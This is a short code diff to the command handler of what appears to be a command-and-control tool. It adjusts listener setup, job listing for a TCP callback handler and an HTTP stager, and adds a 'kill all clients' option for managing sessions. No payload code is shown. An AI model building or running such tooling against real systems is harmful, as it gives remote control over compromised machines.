@@ -177,9 +177,6 @@ class CommandHandler:
                 else:
                         print("No sessions established.")
 
-        # TODO:
-        # Add options for encoded, raw, http
-
         def generate(self, payload: str = "encoded") -> None:
                 if not self.silent_server.listener:
                         return
@@ -205,10 +202,6 @@ class CommandHandler:
                 print(payload)
 
         def jobs(self) -> None:
-                if not self.silent_server.listener and not self.http_server.listener:
-                        print("No jobs running.")
-                        return
-
                 jobs                    = []
                 jobs.append(("TCP Handler", str(self.silent_server.callback_port), bool(self.silent_server.server_thread)))
                 jobs.append(("HTTP Stager", str(self.http_server.listen_port),     bool(self.http_server.server_thread)))
@@ -226,7 +219,9 @@ class CommandHandler:
                                 print("Server already active.")
                                 return
 
-                        self.silent_server = SilentServer(callback_address, port, dwell_time)
+                        self.silent_server.callback_address = callback_address
+                        self.silent_server.callback_port    = port
+                        self.silent_server.dwell_time       = dwell_time
                         
                         if self.silent_server.initialize_server():
                                 core.TextAssets.print_success()
@@ -255,6 +250,10 @@ class CommandHandler:
 
 
         def kill(self, client_id: str) -> None:
+                if client_id == "all":
+                        self.silent_server.kill_clients()
+                        return
+
                 client_id               = client_id.upper()
 
                 if not self.silent_server.clients:
